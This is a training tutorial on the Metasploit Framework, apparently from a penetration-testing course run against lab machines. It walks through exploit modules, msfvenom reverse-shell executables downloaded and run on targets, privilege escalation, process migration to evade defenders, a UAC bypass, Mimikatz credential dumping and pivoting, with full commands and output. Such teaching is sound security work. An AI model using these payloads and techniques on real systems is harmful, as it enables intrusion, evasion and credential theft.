# The Metasploit Framework

It should be clear that locating, working with, and fixing public exploits is difficult. They must be modified to fit each scenario and tested for malicious code. Each uses a unique command-line syntax and there is no standardization in coding practices or languages.

In addition, even in the most basic attack scenarios, there is a variety of post-exploitation tools, auxiliary tools, and attack techniques to consider.

Exploit frameworks aim to address some or all of these issues. Although they vary somewhat in form and function, each aims to consolidate and streamline the process of exploitation by offering a variety of exploits, simplifying the usage of these exploits, easing lateral movement, and assisting with the management of compromised infrastructure. Most of these frameworks offer dynamic payload capabilities. This means that for each exploit in the framework, we can choose various payloads to deploy.

### Setup and Work with MSF

While using a database is not mandatory to run Metasploit, there are various compelling reasons to do so, such as storing information about target hosts and keeping track of successful exploitation attempts. Metasploit uses PostgreSQL as a database service, which is neither active nor enabled on boot time on Kali.

We can start the database service as well as create and initialize the MSF database with msfdb init. To enable the database service at boot time we can use systemctl. Then, you can launch the Metasploit command-line interface with msfconsole, check the database status, and query for help.

```bash
sudo msfdb init
sudo systemctl enable postgresql
sudo msfconsole
> db_status
> help
```

Before we jump into performing operations within Metasploit, let's discuss one important concept first: workspaces. Let's assume we have performed a penetration test and Metasploit stored all information about our target and its infrastructure in the database. When we start the next penetration test, this information still exists in the database. To address this and avoid mixing each assessment's results with results from different assessments, we can use workspaces.

The Metasploit workspace command lists all previously-created workspaces. We can switch to a workspace by adding the name to the command. To create a new workspace, we have to provide the workspace name as argument to -a.

Let's create a workspace named pen200 where we'll store the results of this section and the next one.

```bash
> workspace # List
> workspace -a pen200 # Adds/Creates
```

Now, let's populate the database and get familiar with some of the Database Backend Commands. For this, we'll scan BRUTE2 with db_nmap which is a wrapper to execute Nmap inside Metasploit and save the findings in the database. The command has identical syntax to Nmap:

```bash
msf6 > db_nmap -A 192.168.50.202
```

To get a list of all discovered hosts up to this point, we can enter hosts. In addition, we can enter services to display the discovered services from our port scan. We can also filter for a specific port number by providing it as argument for -p.

```bash
> hosts
...
> services
> services -p 6969
```

When working on an assessment with numerous target systems, the Database Backend Commands are invaluable in identifying important information and discovering potential attack vectors. We can also use the results stored in the database as input to modules. The framework includes several thousand modules, divided into categories, which you can show:

```bash
> show -h
> use module_name
```

The modules all follow a common slash-delimited hierarchical syntax (module type/os, vendor, app, operation, or protocol/module name), which makes it easy to explore and use the modules.

### Auxiliary Modules

The Metasploit Framework includes hundreds of auxiliary modules that provide functionality such as protocol enumeration, port scanning, fuzzing, sniffing, and more. Auxiliary modules are useful for many tasks, including information gathering (under the gather/ hierarchy), scanning and enumeration of various services (under the scanner/ hierarchy), and so on.

To list all auxiliary modules, we can run the show auxiliary command. We can use search to reduce this considerable output, filtering by app, type, CVE ID, operation, platform, and more. For this first example, we want to obtain the SMB version of the previously scanned system BRUTE2 by using a Metasploit auxiliary module.

```bash
> show auxiliary
...
> search type:auxiliary smb
...
> use 56
> info
> show options
> set RHOSTS 192.168.50.202
> show missing
> unset RHOSTS
```

Instead of setting the value manually, we can also set the value of RHOSTS in an automated fashion by leveraging the results in the database. For example, we can set RHOSTS to all discovered hosts with open port 445 by entering services, the port number as argument to -p, and --rhosts to set the results for this option.

```bash
> services -p 445 --rhosts
> run
> vulns # See if Metasploit automatically detected vulns based on the results
```

Next, let's use another module. In the Password Attacks Module, we successfully identified credentials on BRUTE by leveraging a dictionary attack against SSH. Instead of Hydra, we can also use Metasploit to perform this attack. To begin, we'll search for SSH auxiliary modules.

```bash
> search type:auxiliary ssh
> use 15
> show options
> set PASS_FILE /usr/share/wordlists/rockyou.txt
> set USERNAME george
> set RHOSTS 192.168.50.201
> set RPORT 2222
> run
> creds # See if Metasploit found any valid credentials
```

### Exploit Modules

Exploit modules most commonly contain exploit code for vulnerable applications and services. Metasploit contains over 2200 exploits at the time of this writing. Each was meticulously developed and tested, making MSF capable of successfully exploiting a wide variety of vulnerable services. These exploits are invoked in much the same way as auxiliary modules.


```bash
> workspace -a exploits
> search Apache 2.4.49
> use 0
> info
```

Check supported determines if we can use the check command to dry-run the exploit module and confirm if a target is vulnerable before we actually attempt to exploit it.

```bash
> show options
> set payload payload/linux/x64/shell_reverse_tcp
> set LHOST 192.168.45.175
```

In real penetration tests we may face the situation that port 4444 is blocked by firewalls or other security technologies. This is quite common as it is the default port for Metasploit's modules. In situations like this, changing the port number to ports associated with more commonly used protocols such as HTTP or HTTPS may lead to a successful execution of the selected payload.

We should note that we don't need to start a listener manually with tools such as Netcat to receive the incoming reverse shell. Metasploit automatically sets up a listener matching the specified payload.

Now, let's set the options SSL to false and RPORT to 80 since the target Apache web server runs on port 80 without HTTPS. Then, we set RHOSTS to the target IP and enter run.

```bash
> set SSL false
> set RPORT 80
> set RHOSTS 192.168.50.16
> run
```

Before we head to the next section, let's explore the concept of sessions and jobs in Metasploit. Sessions are used to interact and manage access to successfully exploited targets, while jobs are used to run modules or features in the background.

When we launched the exploit with run, a session was created and we obtained an interactive shell. We can send the session to the background by pressing Ctrl+z and confirming the prompt. Once the session is sent to the background, we can use sessions -l to list all active sessions.

```bash
^Z
Background session 2? [y/N]  y

msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -l

Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  ...
  2         shell x64/linux               192.168.119.4:4444 -> 192.168.50.16:35534 (192.168.50.16)

msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -i 2
[*] Starting interaction with 2...

uname -a
Linux c1dbace7bab7 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

We can kill a session with sessions -k and the ID as argument.

Instead of launching an exploit module and sending the resulting session to the background, we can use run -j to launch it in the context of a job. This way, we'll still find the output of launching the exploit module, but we'll need to interact with the resulting session before we can access it.

In an assessment, we'll face numerous targets and it is very easy to lose track of machines we already have access to. Using an exploit framework like Metasploit helps us manage access to these machines.

If we want to execute commands on a specific system, we don't have to search through various terminals to find the correct Netcat listener, we can just interact with the specific session. We can launch exploit modules with run -j in the background and Metasploit will automatically create a session for us while we already work on the next target.

In addition, Metasploit also stores information about targets, module results, and vulnerabilities in the database, which are invaluable for further steps in a penetration test and writing the report for the client.

### Staged vs Non-Staged Payloads

We need to be aware of the buffer size our shellcode will be stored in. If the shellcode size of our exploit exceeds the buffer size, our exploit attempt will fail. In a situation like this, it's vital which payload type we choose: staged or non-staged.

A non-staged payload is sent in its entirety along with the exploit. This means the payload contains the exploit and full shellcode for a selected task. In general, these "all-in-one" payloads are more stable. The downside is that the size of these payloads will be bigger than other types.

In contrast, a staged payload is usually sent in two parts. The first part contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.

There are several situations in which we would prefer to use a staged payload instead of non-staged. If there are space-limitations in an exploit, a staged payload might be a better choice as it is typically smaller. In addition, we need to keep in mind that antivirus software can detect shellcode in an exploit. By replacing the full code with a first stage, which loads the second and malicious part of the shellcode, the remaining payload is retrieved and injected directly into the victim machine's memory. This may prevent detection and can increase our chances of success.

```bash
> show payloads
> set payload 15
> run
```

To search for a staged 32 bit tcp reverse shell:

```bash
show payloads "staged tcp command"
search payload/linux/x64/meterpreter_reverse_https
use payload/linux/x64/meterpreter_reverse_https
```

### Meterpreter Payload

In the previous sections, we used a common TCP reverse shell. While we do have interactive access on a target system with this type of payload, we only have the functionality of a regular command shell. Exploit frameworks often contain more advanced payloads providing features and functionality such as file transfers, pivoting, and various other methods of interacting with the victim machine.

Metasploit contains the Meterpreter payload, which is a multi-function payload that can be dynamically extended at run-time. The payload resides entirely in memory on the target and its communication is encrypted by default. Meterpreter offers capabilities that are especially useful in the post-exploitation phase and exists for various operating systems such as Windows, Linux, macOS, Android, and more. "payload/linux/x64/meterpreter_reverse_tcp" is a classic.

At this point, we should note that all Meterpreter payloads are staged. However, the output of show payloads contains staged and non-staged payloads. The difference between those two types is how the Meterpreter payload is transferred to the target machine. The non-staged version includes all components required to launch a Meterpreter session while the staged version uses a separate first stage to load these components. Loading these components over the network creates quite some traffic and may alert defensive mechanisms. In situations where our bandwidth is limited or we want to use the same payload to compromise multiple systems in an assessment, a non-staged Meterpreter payload comes in quite handy. We'll use the non-staged version whenever we use a Meterpreter payload.

```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > run
meterpreter > help
meterpreter > sysinfo
meterpreter > getuid
```

As we've already learned, Metasploit uses sessions to manage access to different machines. When Metasploit interacts with a system within a session, it uses a concept named channels. Let's start an interactive shell by entering shell, execute a command in the context of a channel, and background the channel the shell runs in. To background a channel, we can use Ctrl+z.

```bash
meterpreter > shell
Process 196 created.
Channel 2 created.
whoami
daemon
^Z
Background channel 2? [y/N]  y
```

```bash
meterpreter > channel -l

    Id  Class  Type
    --  -----  ----
    1   3      stdapi_process
    2   3      stdapi_process

meterpreter > channel -i 1
Interacting with channel 1...

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Next, let's use the download and upload commands from the category File system Commands to transfer files to and from the system. For this, let's review the commands of this category first.

```bash
meterpreter > lpwd
/home/kali

meterpreter > lcd /home/kali/Downloads

meterpreter > lpwd
/home/kali/Downloads

meterpreter > download /etc/passwd
[*] Downloading: /etc/passwd -> /home/kali/Downloads/passwd
[*] Downloaded 1.74 KiB of 1.74 KiB (100.0%): /etc/passwd -> /home/kali/Downloads/passwd
[*] download   : /etc/passwd -> /home/kali/Downloads/passwd

meterpreter > lcat /home/kali/Downloads/passwd
root:x:0:0:root:/root:/bin/bash
...
```

```bash
meterpreter > upload /usr/bin/unix-privesc-check /tmp/
[*] uploading  : /usr/bin/unix-privesc-check -> /tmp/
[*] uploaded   : /usr/bin/unix-privesc-check -> /tmp//unix-privesc-check

meterpreter > ls /tmp
Listing: /tmp
=============

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
...
100644/rw-r--r--  36801    fil   2022-08-08 05:26:15 -0400  unix-privesc-check
```

```bash
msf6 > search type:exploit apache_normalize_path_rce

msf6 > use 0

msf6 exploit(multi/http/apache_normalize_path_rce) > search linux/x64/meterpreter_reverse_https

msf6 exploit(multi/http/apache_normalize_path_rce) > set payload payload/linux/x64/meterpreter_reverse_https

msf6 exploit(multi/http/apache_normalize_path_rce) > info

msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.168.XXX.XXX
RHOSTS => 192.168.XXX.XXX

msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
SSL => false

msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
RPORT => 80

msf6 exploit(multi/http/apache_normalize_path_rce) > set LHOST 192.168.XXX.XXX
LHOST => 192.168.XXX.XXX

msf6 exploit(multi/http/apache_normalize_path_rce) > set LPOST 4444
[!] Unknown datastore option: LPORT. Did you mean LPORT?
LPORT => 4444

msf6 exploit(multi/http/apache_normalize_path_rce) > run
meterpreter > search -f passwords
```

### Executable Payloads

Metasploit also provides the functionality to export payloads into various file types and formats such as Windows and Linux binaries, webshells, and more. Metasploit contains msfvenom1 as a standalone tool to generate these payloads. It provides standardized command line options and includes various techniques to customize payloads.

To get familiar with msfvenom, we'll first create a malicious Windows binary starting a raw TCP reverse shell. Let's begin by listing all payloads with payloads as argument for -l. In addition, we use --platform to specify the platform for the payload and --arch for the architecture.

```bash
kali@kali:~$ msfvenom -l payloads --platform windows --arch x64 
```

Now, let's use the -p flag to set the payload, set LHOST and LPORT to assign the host and port for the reverse connection, -f to set the output format (exe in this case), and -o to specify the output file name:

```bash
kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
```

Now that we have created the malicious binary file, let's use it. For this, we start a Netcat listener on port 443, Python3 web server on port 80, and connect to BRUTE2 via RDP with user justin and password SuperS3cure1337#. Once we've connected over RDP, we can start PowerShell to transfer the file and execute it.

```bash
PS C:\Users\justin> iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe

PS C:\Users\justin> .\nonstaged.exe
```

Once we executed the binary file, we'll receive an incoming reverse shell on our Netcat listener.

Now, let's use a staged payload to do the same. For this, we'll again use msfvenom to create a Windows binary with a staged TCP reverse shell payload.

```bash
kali@kali:~$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe 
```

While we received an incoming connection, we cannot execute any commands through it. This is because Netcat doesn't know how to handle a staged payload.

To get a functional interactive command prompt, we can use Metasploit's multi/handler2 module, which works for the majority of staged, non-staged, and more advanced payloads. Let's use this module to receive the incoming connection from staged.exe.

In Metasploit, let's select the module with use. Then, we have to specify the payload of the incoming connection. In our case, this is windows/x64/shell/reverse_tcp. In addition, we have to set the options for the payload. We enter the IP of our Kali machine as argument for LHOST and port 443 as argument for LPORT. Finally, we can enter run to launch the module and set up the listener.

```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp

msf6 exploit(multi/handler) > show options
...
Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
...

msf6 exploit(multi/handler) > set LHOST 192.168.119.2
LHOST => 192.168.119.2
msf6 exploit(multi/handler) > set LPORT 443

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.119.2:443 
```

Once our listener is running on port 443, we can start staged.exe again on BRUTE2. Our Metasploit multi/handler receives the incoming staged payload and provides us with an interactive reverse shell in the context of a session.

We received the staged reverse shell and Metasploit started a session for us to use. For staged and other advanced payload types (such as Meterpreter), we must use multi/handler instead of tools like Netcat in order for the payload to work.

Using run without any arguments will block the command prompt until execution finishes or we background the session. As we've learned before, we can use run -j to start the listener in the background, allowing us to continue other work while we wait for the connection. We can use the jobs command to get a list of all currently active jobs, such as active listeners waiting for connections.

Let's exit our session and restart the listener with run -j. Then, we'll list the currently active jobs using jobs. Once we execute staged.exe again, Metasploit notifies us that a new session was created.

```bash
C:\Users\justin> exit
exit

[*] 192.168.50.202 - Command shell session 6 closed.  Reason: User exit
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.119.2:443 

msf6 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                        Payload opts
  --  ----                    -------                        ------------
  1   Exploit: multi/handler  windows/x64/shell/reverse_tcp  tcp://192.168.119.2:443

msf6 exploit(multi/handler) > 
```

As Metasploit created a new session for the incoming connection, we could now again interact with it with sessions -i and the session ID as argument.

We can use the generated executable payloads from msfvenom in various situations during a penetration test. First, we can use them to create executable file types such as PowerShell scripts, Windows executables, or Linux executable files to transfer them to a target and start a reverse shell. Next, we can create malicious files such as web shells to exploit web application vulnerabilities. Finally, we can also use the generated files from msfvenom as part of a client-side attack.

In this section, we explored executable payloads generated with msfvenom. We got familiar with how we can use msfvenom to generate executable files containing these payloads and how to set up multi/handler as listener for staged and non-staged payloads alike. Using msfvenom to generate executable files with various payloads and in numerous file types will assist us greatly in penetration tests.

### Performing Post-Exploitation with Metasploit

Once we gain access to a target machine, we can move on to the post-exploitation phase where we gather information, take steps to maintain our access, pivot to other machines, elevate our privileges, and so on.

The Metasploit Framework has several interesting post-exploitation features that can simplify many aspects of the process. In addition to the built-in Meterpreter commands, a number of post-exploitation MSF modules take an active session as an argument and perform post-exploitation operations on them.

In this Learning Unit, we'll explore these post-exploitation features and modules. We'll also perform pivoting with modules of the Metasploit Framework.
Core Meterpreter Post-Exploitation Features

In previous sections, we used the Meterpreter payload to navigate the file system, obtain information about the target system, and transfer files to and from the machine. Apart from the commands we already used, Meterpreter contains numerous post-exploitation features.

Let's explore some of these features. We should note that the Linux Meterpreter payload contains fewer post-exploitation features than the Windows one. Therefore, we'll explore these features on the Windows target ITWK01. Let's assume we already gained an initial foothold on the target system and deployed a bind shell as way of accessing the system.

To begin, we'll create an executable Windows binary with msfvenom containing a non-staged Meterpreter payload and name it met.exe.

```bash
kali@kali:~$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe
```

After we set the payload and its options, we launch the previously activated multi/handler module in Metasploit.

```bash
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
payload => windows/x64/meterpreter_reverse_https

msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443

msf6 exploit(multi/handler) > run
[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.119.4:443
```

Next, we start a Python3 web server to serve met.exe. Then, we connect to the bind shell on port 4444 on ITWK01. Once connected, we can download met.exe with PowerShell and start the Windows binary.

```bash
kali@kali:~$ nc 192.168.50.223 4444
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.45.176:8000/met.exe -Outfile met.exe
iwr -uri http://192.168.119.2/met.exe -Outfile met.exe

PS C:\Users\dave> .\met.exe
.\met.exe

PS C:\Users\dave>
```

Once the Windows binary is executed, Metasploit notifies us that it opened a new session.

Now that we have an active Meterpreter session on a Windows target we can start exploring post-exploitation commands and features.

The first post-exploitation command we use is idletime. It displays the time for which a user has been idle. After obtaining basic information about the current user and operating system, this should be one of our first commands as it indicates if the target machine is currently in use or not.

```bash
meterpreter > idletime
User has been idle for: 9 mins 53 secs
```

The output states that the user hasn't been interacting with the system for 9 minutes and 53 seconds, suggesting the user may have stepped away from their computer. If the result of the idletime command indicates that the user is away, we can take this as an opportunity to execute programs or commands which may display a command-line window such as CMD or PowerShell for a brief moment.

For several post-exploitation features, we need administrative privileges to execute them. Metasploit contains the command getsystem, which attempts to automatically elevate our permissions to NT AUTHORITY\SYSTEM. It uses various techniques using named pipe impersonation and token duplication. In the default settings, getsystem uses all available techniques (shown in the help menu) attempting to leverage SeImpersonatePrivilege1 and SeDebugPrivilege.2

Before we execute getsystem, let's start an interactive shell and confirm that our user has one of those two privileges assigned.

```bash
meterpreter > shell
...

C:\Users\luiza> whoami /priv
exit
meterpreter > getuid
Server username: ITWK01\luiza

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Getsystem successfully elevated our privileges to NT AUTHORITY\SYSTEM by using Named Pipe Impersonation (PrintSpooler variant) as we did manually in the Windows Privilege Escalation Module.

Another important post-exploitation feature is migrate. When we compromise a host, our Meterpreter payload is executed inside the process of the application we attack or execute our payload. If the victim closes that process, our access to the machine is closed as well. In addition, depending on how the Windows binary file containing the Meterpreter payload is named, the process name may be suspicious if a defender is searching through the process list. We can use migrate to move the execution of our Meterpreter payload to a different process.

Let's view all running processes by entering ps in the Meterpreter command prompt.

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                         Arch  Session  User                          Path
 ---   ----  ----                         ----  -------  ----                          ----
 2552   8500  met.exe                      x64   0        ITWK01\luiza                  C:\Users\luiza\met.exe 
... 
 8052   4892  OneDrive.exe                 x64   1        ITWK01\offsec  
```

The process met.exe has the process ID 2552. The name and path will easily make the process stand out to a defender reviewing the process list. The output shows that offsec started a process related to OneDrive with process ID 8052. If our payload runs within this process, it is far less likely to be detected by reviewing the process list.

We should note that we are only able to migrate into processes that execute at the same (or lower) integrity and privilege level3 than that of our current process. In the context of this example, we already elevated our privileges to NT AUTHORITY\SYSTEM so our choices are plentiful.

Let's migrate our current process to OneDrive.exe of the user offsec by entering migrate and the process ID we want to migrate to.

```bash
meterpreter > migrate 8052
[*] Migrating from 2552 to 8052...
[*] Migration completed successfully.

meterpreter > ps
```

We successfully migrated our process to the OneDrive process. When reviewing the process list, we'll find our original process, met.exe with ID 2552, does not exist anymore. Furthermore, we'll notice that the ps output contains less information than before. The reason for this is that we are now running in the context of the process with the ID 8052 and therefore, as user offsec.

```bash
meterpreter > getuid
Server username: ITWK01\offsec
```

Instead of migrating to an existing process or a situation in which we won't find any suitable processes to migrate to, we can use the execute Meterpreter command. This command provides the ability to create a new process by specifying a command or program.

To demonstrate this, let's start a hidden Notepad process and migrate to it as user offsec. For this, we use execute with -H to create the process hidden from view and notepad_ as argument for -f to specify the command or program to run. Then, we migrate to the newly spawned process.

```bash
meterpreter > execute -H -f notepad
Process 2720 created.

meterpreter > migrate 2720
[*] Migrating from 8052 to 2720...
[*] Migration completed successfully.

meterpreter > 
```

We can migrate to the newly spawned Notepad process. Since we used the option -H, the Notepad process was spawned without any visual representation. However, the process is still listed in the process list of applications such as the task manager.

This concludes this section. We explored several post-exploitation features of Meterpreter. First, we used idletime to check if the user is actively working on the target system or not. Next, we elevated our privileges with the help of getsystem. Finally, we used migrate to move the execution of our Meterpreter payload to a different process.

Meterpreter offers a variety of other interesting post-exploitation modules such as hashdump, which dumps the contents of the SAM database or screenshare, which displays the target machine's desktop in real-time.

While these Meterpreter features are quite powerful, Metasploit contains numerous post-exploitation modules that extend the basic post-exploitation features we explored in this section. We'll review and use some of them in the next section.

### Post-Exploitation Modules

In addition to native commands and actions in the core functions of Meterpreter, there are several post-exploitation modules we can deploy against an active session.

Sessions that were created through attack vectors such as the execution of a client-side attack will likely provide us only with an unprivileged shell. But if the target user is a member of the local administrators group, we can elevate our shell to a high integrity level if we can bypass User Account Control (UAC).

In the previous section, we migrated our Meterpreter shell to a OneDrive.exe process that is running at (presumably) medium integrity. For this section, let's repeat the steps from the previous section and then bypass UAC with a Metasploit post-exploitation module to obtain a session in the context of a high integrity level process.

As before, we connect to the bind shell on port 4444 on ITWK01, download and execute met.exe, and enter getsystem to elevate our privileges. Then, we use ps to identify the process ID of OneDrive.exe, and migrate to it.

```bash
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > ps

Process List
============

 PID    PPID  Name                         Arch  Session  User                          Path
 ---    ----  ----                         ----  -------  ----                          ----
...
 8044   3912  OneDrive.exe                 x64   1        ITWK01\offsec                 C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
...

meterpreter > migrate 8044 # or migrate -N OneDrive.exe
[*] Migrating from 9020 to 8044...
[*] Migration completed successfully.

meterpreter > getuid
Server username: ITWK01\offsec
```

We are now running in the context of offsec again. While this is an administrative account, UAC prevents us from performing administrative operations as we learned in previous Modules. Before we attempt to bypass UAC, let's confirm that the current process has the integrity level Medium.

To display the integrity level of a process, we can use tools such as Process Explorer2 or third-party PowerShell modules such as NtObjectManager.3 Let's assume the latter is already installed on the system.

Once we import the module with Import-Module,4 we can use Get-NtTokenIntegrityLevel5 to display the integrity level of the current process by retrieving and reviewing the assigned access token.

```bash
meterpreter > shell
Process 6436 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager

PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
Medium
```

We are currently performing operations in the context of integrity level Medium.

Next, let's background the currently active channel and session to search for and leverage UAC post-exploitation modules.

```bash
PS C:\Windows\system32> ^Z
Background channel 1? [y/N]  y

meterpreter > bg
[*] Backgrounding session 9...
```

Now let's search for UAC bypass modules.

```bash
msf6 exploit(multi/handler) > search UAC
```

The search yields quite a few results. One very effective UAC bypass on modern Windows systems is exploit/windows/local/bypassuac_sdclt, which targets the Microsoft binary sdclt.exe. This binary can be abused to bypass UAC by spawning a process with integrity level High.6

To use the module, we'll activate it and set the SESSION and LHOST options as shown in the following listing. Setting the SESSION for post-exploitation modules allows us to directly execute the exploit on the active session. Then, we can enter run to launch the module.

```bash
msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/local/bypassuac_sdclt) > show options

Module options (exploit/windows/local/bypassuac_sdclt):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   PAYLOAD_NAME                   no        The filename to use for the payload binary (%RAND% by default).
   SESSION                        yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
...

msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 9
SESSION => 32
msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.119.4
LHOST => 192.168.119.4
msf6 exploit(windows/local/bypassuac_sdclt) > run

[*] Started reverse TCP handler on 192.168.119.4:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[!] This exploit requires manual cleanup of 'C:\Users\offsec\AppData\Local\Temp\KzjRPQbrhdj.exe!
[*] Please wait for session and cleanup....
[*] Sending stage (200774 bytes) to 192.168.50.223
[*] Meterpreter session 10 opened (192.168.119.4:4444 -> 192.168.50.223:49740) at 2022-08-04 09:03:54 -0400
[*] Registry Changes Removed

meterpreter > 
```

Our UAC bypass post-exploitation module created a new Meterpreter session for us.

Let's check the integrity level of the process as we did before.

```bash
meterpreter > shell
Process 2328 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager

PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
High
```

Te process our payload runs in has the integrity level High and therefore we have successfully bypassed UAC.

Besides being able to background an active session and execute modules through it, we can also load extensions directly inside the active session with the load command.

One great example of this is Kiwi, which is a Meterpreter extension providing the capabilities of Mimikatz. Because Mimikatz requires SYSTEM rights, let's exit the current Meterpreter session, start the listener again, execute met.exe as user luiza in the bind shell, and enter getsystem.

```bash
msf6 exploit(windows/local/bypassuac_sdclt) > use exploit/multi/handler
[*] Using configured payload windows/x64/meterpreter_reverse_https

msf6 exploit(multi/handler) > run
...
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
```

Now, let's enter load with kiwi as argument to load the Kiwi module. Then, we can use help to display the commands of the Kiwi module. Finally, we'll use creds_msv to retrieve LM7 and NTLM8 credentials.

```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

meterpreter > help
...
meterpreter > creds_msv
...
Username  Domain  NTLM                              SHA1
--------  ------  ----                              ----
luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a0d837
...
```

First, we discussed what post-exploitation modules in Metasploit are and how we can use them. Then, we used a post-exploitation module on a session to bypass UAC and obtain a shell with high integrity level. Next, we loaded a Meterpreter extension named Kiwi, which provides the capabilities of Mimikatz to retrieve credentials from a system with sufficient privileges.

### Pivoting with Metasploit

The ability to pivot to another target or network is a vital skill for every penetration tester. In Port Redirection and Pivoting, we learned various techniques to perform pivoting. Instead of using these techniques manually, we can also use Metasploit to perform them.

As in the previous sections, we'll connect to the bind shell on port 4444 on the machine ITWK01. Let's assume we are currently gathering information on the target. In this step, we'll identify a second network interface.

```bash
C:\Users\luiza> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::c489:5302:7182:1e97%11
   IPv4 Address. . . . . . . . . . . : 192.168.50.223
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::b540:a783:94ff:89dc%14
   IPv4 Address. . . . . . . . . . . : 172.16.5.199
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

C:\Users\luiza>
```

The second interface has the assigned IP 172.16.5.199. We can try to identify other live hosts on this second network by leveraging methods from active information gathering. Before we do so, let's start a Meterpreter shell on our compromised target by downloading and executing met.exe as well as starting the corresponding multi/handler as we did before.

```bash
[*] Started HTTPS reverse handler on https://192.168.119.4:443
...
[*] Meterpreter session 12 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-05 05:13:42 -0400

meterpreter > 
```

Now that we have a working session on the compromised system, we can background it. To add a route to a network reachable through a compromised host, we can use route add with the network information and session ID that the route applies to. After adding the route, we can display the current routes with route print.

```bash
meterpreter > bg
[*] Backgrounding session 12...

msf6 exploit(multi/handler) > route add 172.16.5.0/24 12
[*] Route added

msf6 exploit(multi/handler) > route print

